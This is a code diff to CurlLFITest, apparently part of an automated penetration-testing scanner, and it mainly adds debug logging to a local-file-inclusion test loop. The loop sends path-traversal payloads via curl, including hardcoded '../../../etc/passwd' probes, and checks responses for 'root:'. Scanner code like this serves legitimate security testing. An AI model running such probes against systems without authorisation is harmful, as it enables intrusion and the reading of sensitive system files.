@@ -579,6 +579,9 @@ class CurlLFITest(ServiceScan):
         # Use discovered endpoints or fallback to defaults
         test_endpoints = discovered_endpoints if discovered_endpoints else fallback_endpoints
         service.info(f"🎯 Testing {len(test_endpoints)} endpoints with {len(parameters)} parameters")
+        service.debug(f"Endpoints to test: {test_endpoints[:10]}...")  # Show first 10 endpoints
+        service.debug(f"Parameters to test: {parameters[:10]}...")  # Show first 10 parameters
+        service.debug(f"Payloads available: {len(payloads)}")
         
         # Ensure we always test at least some basic combinations
         if not test_endpoints:
@@ -602,16 +605,23 @@ class CurlLFITest(ServiceScan):
             f.write(f"Max tests: {max_tests}\n\n")
             
             # Test endpoints and parameters
+            service.debug(f"🔄 Starting test loop: {len(test_endpoints)} endpoints × {len(parameters)} params × {len(payloads)} payloads = {len(test_endpoints) * len(parameters) * len(payloads)} potential tests (max: {max_tests})")
             for endpoint in test_endpoints:
+                service.debug(f"🎯 Testing endpoint: {endpoint}")
                 if tests_run >= max_tests:
+                    service.debug(f"Max tests reached at endpoint {endpoint}: {tests_run}/{max_tests}")
                     break
                     
                 for param in parameters:
+                    service.debug(f"🔍 Testing parameter: {param}")
                     if tests_run >= max_tests:
+                        service.debug(f"Max tests reached at parameter {param}: {tests_run}/{max_tests}")
                         break
                         
                     for payload in payloads:
+                        service.debug(f"💣 Testing payload: {payload[:20]}...")
                         if tests_run >= max_tests:
+                            service.debug(f"Max tests reached at payload: {tests_run}/{max_tests}")
                             break
                             
                         # Build test URL
@@ -622,9 +632,18 @@ class CurlLFITest(ServiceScan):
                         curl_cmd = f'curl -s -k -m {timeout} -w "\\nHTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}\\n" -H "User-Agent: {user_agent}" "{test_url}"'
                         
                         try:
-                            result = await service.execute(curl_cmd, capture=True)
+                            # Increment test count before attempting execution
                             tests_run += 1
+                            service.debug(f"Running LFI test {tests_run}/{max_tests}: {test_url}")
                             
+                            result = await service.execute(curl_cmd, capture=True)
+                            
+                            if result and result.stdout:
+                                service.debug(f"LFI test {tests_run} got response")
+                            else:
+                                service.debug(f"LFI test {tests_run} failed - no result or stdout")
+                                continue
+                                
                             if result and result.stdout:
                                 # Parse response
                                 response_lines = result.stdout.strip().split('\n')
@@ -693,6 +712,7 @@ class CurlLFITest(ServiceScan):
                             
                         except Exception as e:
                             service.debug(f"Error testing {test_url}: {e}")
+                            service.warn(f"LFI test failed for {endpoint}?{param}={payload}: {e}")
                             continue
         
         # Run fallback ffuf scan if no vulnerabilities found and ffuf fallback is enabled
@@ -711,6 +731,7 @@ class CurlLFITest(ServiceScan):
         # If still no tests were run, ensure we run at least some basic tests
         if tests_run == 0:
             service.warn("🚨 No LFI tests were executed! Running emergency basic tests...")
+            service.debug(f"Emergency test trigger: test_endpoints={test_endpoints}, parameters={parameters}, payloads={len(payloads)}")
             emergency_endpoints = ["/"]
             emergency_params = ["file", "page"]
             emergency_payloads = ["../../../etc/passwd", "../../../../etc/passwd"]
@@ -722,9 +743,9 @@ class CurlLFITest(ServiceScan):
                         test_url = f"{base_url}?{param}={quote(payload)}"
                         
                         try:
+                            tests_run += 1
                             curl_cmd = f'curl -s -k -m {timeout} -w "\\nHTTP_CODE:%{{http_code}}\\n" -H "User-Agent: {user_agent}" "{test_url}"'
                             result = await service.execute(curl_cmd, capture=True)
-                            tests_run += 1
                             
                             if result and result.stdout and "root:" in result.stdout:
                                 service.info(f"🚨 Emergency test found potential LFI: {test_url}")
